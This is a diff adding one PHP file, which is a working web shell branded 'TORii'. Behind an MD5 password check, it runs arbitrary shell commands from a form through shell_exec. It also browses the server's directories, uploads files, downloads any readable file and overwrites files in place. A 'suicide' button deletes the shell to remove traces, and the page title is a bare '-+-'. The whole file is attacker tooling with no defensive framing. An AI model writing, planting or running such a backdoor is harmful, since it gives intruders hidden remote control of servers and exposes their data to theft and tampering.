@@ -1,0 +1,383 @@
+<?php
+
+
+	session_start();
+
+	$password =  $_POST["passwd"];
+
+
+	$CURRENT_PATH = $_SERVER["PHP_SELF"];
+
+	
+
+
+	$mode = $_GET["mode"];
+
+
+	$path = $_GET["path"];
+
+	if(empty($path))
+	{
+	$path = str_replace(basename(__FILE__), "", realpath(__FILE__));
+	} else {
+
+	if($mode != 'edit' && $mode != 'modify' && $mode != 'download')
+		$path = realpath($path)."/";
+	}
+
+	$accessFlag = $_SESSION["accessFlag"];
+	
+
+
+
+	function getDirList($getPath){
+
+		$listArr = array();
+		$handler = opendir($getPath);
+		
+		while($file = readdir($handler)){
+			if(is_dir($getPath.$file) == '1'){
+				$listArr[] = $file;
+			}
+		}	
+		
+		closedir($handler);
+		return $listArr;
+	}
+
+	function getFileList($getPath){
+		
+		$listArr = array();
+		$handler = opendir($getPath);		
+		
+		while($file = readdir($handler)){
+			if(is_dir($getPath.$file) != '1'){
+				$listArr[] = $file;
+			}
+		}
+	
+		closedir($handler);
+		return $listArr;
+	}
+
+	
+
+
+	$cmd = $_POST["cmd"];
+
+	$cmd = "cd ".$path.";".$cmd;
+
+	$result = shell_exec($cmd);
+
+
+?>
+
+<?php
+
+
+	$suicide = $_POST["suicide"];	
+	
+	$my_path = $path.basename($CURRENT_PATH);
+	
+	if($suicide == "activity"){
+		if(!unlink($my_path)){
+			echo "<script>alert('FAILED SUICIDE!')</script>";
+			exit();
+		}
+	}
+?>
+
+
+<?php
+
+
+	if($mode == "upload")
+	{
+		$name = $_FILES['file']['name'];
+	
+		move_uploaded_file($_FILES['file']['tmp_name'], "$path$name");
+
+
+	}
+	else if($mode == "download"){
+	
+		$filesize = filesize($path);
+		$filename = basename($path);
+
+		header('Content-Type: application/octet-stream');
+		header('Content-Disposition: attachmen; filename='.$filename);
+		header('Content-Transfer-Encoding: binary');
+		header("Content-Length: $filesize");
+
+
+		ob_clean();
+		flush();
+		readfile($path);
+
+		exit();
+	}
+	else if($mode == "modify"){
+
+		$fileContents =  $_POST["fileContents"];
+		$fp = fopen($path, "w");
+		fputs($fp, $fileContents, strlen($fileContents));
+		echo "<script>history.back()</script>";
+		exit();
+	}
+?>
+
+
+<?php
+	
+	if(md5($_POST["passwd"]) == "ab7a3955bfd45d043dc2227029fef5bd"){
+		$_SESSION["accessFlag"] = "Y";
+		
+		echo "<script>location.href='$CURRENT_PATH'</script>";
+	
+		exit();
+	}
+	
+?>
+
+
+<html>
+	
+	<head>
+	<title>-+-</title>
+	</head>
+
+	<?php	if($accessFlag != "Y")	{ ?>
+
+	<body>
+	
+		<form action="<?=$CURRENT_PATH?>" method="post">
+
+			<input type="password" name="passwd" placeholder="Enter password here">
+
+			<input type="submit">
+
+		</form>
+
+	</body>
+	
+
+	<?php }else{ ?>
+
+	<title>-+-</title>
+
+
+	<body>
+				
+		<h1><a href="<?=$CURRENT_PATH?>">⛩ TORii</a></h1>
+
+
+		<h5>🐚 SHELL PATH: <?=$CURRENT_PATH?> </h5>
+
+		<h5>📁 Current PATH: <?=$path?> </h5>
+
+
+
+<?php if(!$mode == "edit") { ?>
+	<div style="">
+
+		<table>
+
+			<td>
+				<div>
+					<form enctype='multipart/form-data' action="<?=$CURRENT_PATH?>?mode=upload&path=<?=$path?>" method="post">
+						<input type='file' name='file'>
+						<button>📤 upload</button>
+					</form>
+				</div>
+			</td>
+			
+
+			<td>
+				<div>
+					<form action="<?=$CURRENT_PATH?>" method="post">
+						<input style="display:none;" type='text' name='suicide' value='activity'>
+						<button>☠ suicide</button>
+					</form>
+				</div>
+			</td>
+		</table>
+	</div>
+
+
+
+
+
+
+	
+
+	<div style="float: left;">
+		
+
+		<table style="width: 600px;border: 1px solid black;margin: 0 auto;">
+			<th>command</th>
+
+			<tr>
+				
+				<td>
+					<?php
+
+					echo "<div style='height:500px; padding: 3px; border:1px solid black; overflow: scroll; background-color: black; color:white;'>";
+
+					$result = str_replace("\n", "<br>", $result);
+					echo $result;
+
+
+					echo "</div>";
+					?>
+
+				</td>
+
+
+			</tr>
+
+
+			<tr >	
+				<td>
+					<form action="<?=$CURRENT_PATH?>?path=<?=$path?>" method="post">
+						<input size="69" type="text" name="cmd">
+						<input type="submit" value="execute">
+
+					</form>
+				</td>
+			</tr>
+
+		</table>
+
+		
+
+	</div>
+
+	<?php } ?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<div style="width: 100%">
+
+
+	<table style="width: 600px;border: 1px solid black;margin: 0 auto;">
+
+
+			<th>
+
+			<?php if($mode != 'edit') { ?>
+
+
+
+
+				<button style="float:left; margin: 3px;" onclick="javascript:history.back()"> < </button>
+
+				<input id=route size=50 style="font-size:17px" value="<?=$path?>">
+				<button style="width: 60px; height: 25px;" onclick="javascript:location.href='<?=$CURRENT_PATH?>?path='+document.getElementById('route').value">GO</button>
+
+
+			<?php } ?>
+
+			</th>
+		
+		<tr>		
+		
+		<td>
+
+
+	
+
+		<?php if($mode != 'edit') { ?>			
+
+
+		
+		<table style="width: 600px;border: 1px solid black;margin: 0 auto;">
+	
+		<?php
+			$dirList = getDirList($path);
+
+			for($i=0; $i<count($dirList); $i++){
+							
+		?>
+
+			<?php if($dirList[$i] != ".") { ?>
+
+
+			<tr><td style="padding-left:10px"> <a href="<?=$CURRENT_PATH?>?path=<?=$path.$dirList[$i]?>"> <b> 📂 <?=$dirList[$i]?> </b> </a> </td></tr>
+
+			<?php } ?>
+
+		<?php } ?>
+
+
+
+
+		<?php
+			$fileList = getFileList($path);
+			for($i=0; $i<count($fileList); $i++){
+			
+			$href = $path.$fileList[$i];
+		?>
+			
+			<tr>
+				<td style="padding-left: 10px"> <a href="<?=$CURRENT_PATH?>?mode=edit&path=<?=$href?>"> 📄 <?=$fileList[$i]?> </a> <a href="<?=$CURRENT_PATH?>?&mode=download&path=<?=$href?>">[download]</a> </td>
+			</tr>
+			
+		<?php } ?>
+
+
+		<?php }else{ ?>
+
+
+		<?php
+			$fp = fopen($path,"r") or die("FAILED, FILE POINTER ERROR");
+
+			$fileContents = @fread($fp, filesize($path));
+			fclose($fp);
+
+		?>
+
+		<button style="float:left; margin: 3px;" onclick="javascript:history.back()"> < </button>
+		
+		<form action="<?=$CURRENT_PATH?>?mode=modify&path=<?=$path?>" method="POST">
+
+	
+
+		<input id=route size=50 style="font-size:17px" value="<?=$path?>" disabled/>				
+
+		<button style="width: 60px; height: 25px;" type="submit" >Modify</button>
+
+
+		<textarea name="fileContents" cols="82" rows="30"><?=htmlspecialchars($fileContents)?></textarea>
+		</form>
+
+		<?php } ?>	
+
+
+		</table>
+	
+	</tr>
+	</td>
+	
+	</table>
+
+	</div>
+
+
+
+
+
+	</body>
+
+	<?php } ?>
+
+</html>
